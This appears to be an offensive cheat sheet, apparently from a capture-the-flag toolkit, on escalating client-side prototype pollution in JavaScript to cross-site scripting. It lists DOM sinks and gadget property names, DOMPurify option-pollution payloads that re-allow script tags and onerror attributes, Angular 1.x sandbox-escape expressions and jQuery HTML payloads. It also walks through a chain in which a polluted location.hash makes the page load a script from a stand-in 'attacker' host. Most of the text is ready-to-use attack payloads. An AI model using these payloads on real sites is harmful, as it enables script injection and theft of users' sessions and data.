# Pollution → XSS — the client-side payoff paths

Client-side PP earns its keep when a polluted property reaches a DOM
sink — a `script.src`, an `innerHTML`, an `eval`, an event handler,
a sanitizer option. The write is `Object.prototype.x = v`; the XSS
is what a later read does with `v`.

---

## 1. The read-sites that render

```js
// the patterns that turn pollution into XSS
script.src = opts.src || defaultSrc;       // pollute 'src'
el.innerHTML = tpl || fallback;            // pollute the fallback
eval(opts.code || "init()");
new Function(opts.handler)()
$(opts.selector)                            // jQuery selector → HTML
document.write(opts.html || "")
location.hash.slice(1) into innerHTML      // plus PP into a used var
iframe.src = opts.frame || "about:blank"
img.src = opts.avatar || "/default.png"
element.setAttribute('onerror', opts.hook)
```

## 2. The sanitizer-option pollution

DOMPurify and friends take an options object — a polluted property
name IS an option:

```js
DOMPurify.sanitize(html, {ALLOWED_TAGS: [...]})
// pollute: __proto__.ALLOWED_TAGS = ["script","iframe","img","a"]
//          __proto__.FORBID_TAGS = []
//          __proto__.ALLOWED_ATTR = ["src","href","onerror","onclick"]
//          __proto__.RETURN_DOM = true
//          __proto__.SANITIZE_DOM = false
//          __proto__.KEEP_CONTENT = true
//          __proto__.ALLOW_UNKNOWN_PROTOCOLS = true
//          __proto__.USE_PROFILES = {html:1,svg:1,mathMl:1}
//          __proto__.ADD_TAGS = ["script","iframe"]
//          __proto__.ADD_ATTR = ["onerror","onclick","src"]
```

The payoff pair: `ADD_TAGS`/`ADD_ATTR` — they MERGE with defaults,
so `{"__proto__":{"ADD_TAGS":["script"]}}` adds script to the
allowed list without removing anything else.

## 3. The templating-on-client paths

```js
// mustache/handlebars/ejs running in the browser
Mustache.render(tpl, data)               // pollute partials/tags
Handlebars.compile(tpl, opts)            // helpers/partials/compat
_.template(tpl, {variable: "x;CODE;y"})  // the 'variable' option
ejs.render(tpl, opts)                    // outputFunctionName works!
Vue template compile options
Angular expression sandbox (legacy)      // __proto__ walks helped
```

`_.template`'s `variable`/`evaluate`/`interpolate`/`escape` options
are the client-side equivalent of `outputFunctionName` — pollute
them and the compiler embeds your JS.

## 4. The gadgets by property name

| Polluted name | Sink that reads it | Payoff |
|---|---|---|
| `src` | script/img/iframe.src | load attacker JS |
| `href` | a.href, location, form.action | navigation/JS URL |
| `innerHTML`/`html` | el.innerHTML = x | markup injection |
| `code`/`handler`/`fn` | eval/new Function | direct exec |
| `selector` | `$(x)` | jQuery HTML-parse XSS |
| `url`/`uri`/`api` | fetch/ajax | request to attacker origin |
| `template`/`tpl` | render() | SSTI-in-browser |
| `onerror`/`onload`/`onclick` | setAttribute/addEvent | event handler |
| `style`/`css` | el.style/css url | CSS-based exfil/injection |
| `data-*` attr names | el.dataset reads | secondary config reads |
| `nonce`/`integrity` | script attr | CSP bypass aid |
| `baseURI`/`base` | `<base>` clobber | relative-URL hijack |
| `target` | a.target="_self"+href | navigation control |
| `sandbox`/`allow` | iframe attrs | loosen frame sandbox |
| `formaction` | button's formaction | form-target hijack |
| `action`/`method` | form props | exfil the form POST |
| `id`/`name`/`class` | setAttribute | DOM-clobber seed |
| `textContent`/`value` | element prop | the exfil carrier |

## 5. The "pollute then trigger" sequencing

```js
// the write lands (client-side merge of a JSON blob, e.g. from a
// stored profile / URL fragment / postMessage / localStorage)
merge(config, JSON.parse(location.hash.slice(1)))
// → location.hash = #{"__proto__":{"src":"https://attacker/x.js"}}

// then the app's own code runs a read:
var s = document.createElement('script');
s.src = (opts.src || '/default.js');       // reads polluted 'src'
document.body.appendChild(s);              // → x.js executes
```

The trigger doesn't need another request — ANY app path that reads
the polluted name after the merge fires it.

## 6. The carrier sources for client-side PP

| Carrier | Shape |
|---|---|
| `location.hash` / `location.search` | `#{"__proto__":{...}}` / `?x=` |
| `postMessage` | `window.postMessage({__proto__:{...}})` |
| `localStorage`/`sessionStorage` | stored JSON the app merges |
| a stored JSON blob (profile/settings) | server-stored, client-merged |
| URL-decoded JSON in a param | `?config=%7B...%7D` |
| a fetched JSON the app merges | attacker-influenced response |
| `document.cookie` parsed | a cookie the app JSON.parses |
| `navigator`/`window` fields merged | rare |
| a WebSocket message | realtime JSON merge |

## 7. jQuery's `$(html)` — the quiet sink

`$(opts.x)` where `x` is a polluted string that looks like a
selector — jQuery's `$()` treats a string starting with `<` as HTML:

```js
$(settings.selector)   // pollute 'selector' = "<img src=x onerror=...>"
$.parseHTML(opts.tpl)  // direct
$(`#${opts.id}`)       // id interpolation — not this class
```

jQuery 3.x mostly requires the leading `<` — pollute the whole
option value, not a fragment.

## 8. The angular-sandbox legacy

Angular 1.x expression sandbox had multiple `__proto__`-adjacent
breaks — an expression reaching `constructor`/`prototype` chains:

```
{{constructor.constructor('alert(1)')()}}
{{a.__proto__.constructor.constructor('alert(1)')()}}
{{''.sub.call.call.call.call.constructor('alert(1)')()}}
{{toString.constructor.prototype.toString.call.constructor('alert(1)')()}}
```

Client-side PP into `Object.prototype` can feed a value into a
sandboxed expression's lookup — a niche but real chain.

## 9. The "sanitizer allows the polluted name" subtlety

DOMPurify reads its config with `hasOwnProperty`-style checks in
some versions — a polluted `ADD_TAGS` may be IGNORED because the
config read checks own-properties. Test the version:

```js
// quick check — does DOMPurify read inherited options?
// (behavior varies by version; the corpus probe is one request)
```

When the config read is `cfg.k || def` (inherited ok), PP works;
when it's `cfg.hasOwnProperty(k)`, PP fails — falsifier: the read
is own-only.

## 10. Event-handler option pollution

```js
el.addEventListener(opts.event || 'click', cb)
// pollute 'event' — not XSS, but a mis-trigger
el.setAttribute(opts.attr, opts.val)
// pollute both names: attr='onerror', val='CODE'
```

`addEventListener` won't take a code string; `setAttribute('on' + e,
code)` DOES inline-code it on some paths (attribute-to-handler).

## 11. The ledger

```bash
python3 tools/state.py <chal> --hypothesis "client-PP reaches a DOM sink"
# refutes when: the merge is server-side only; the polluted name
# is never read into a sink; the sink's read is own-only; the
# sanitizer runs AFTER the merge with own-property checks
```
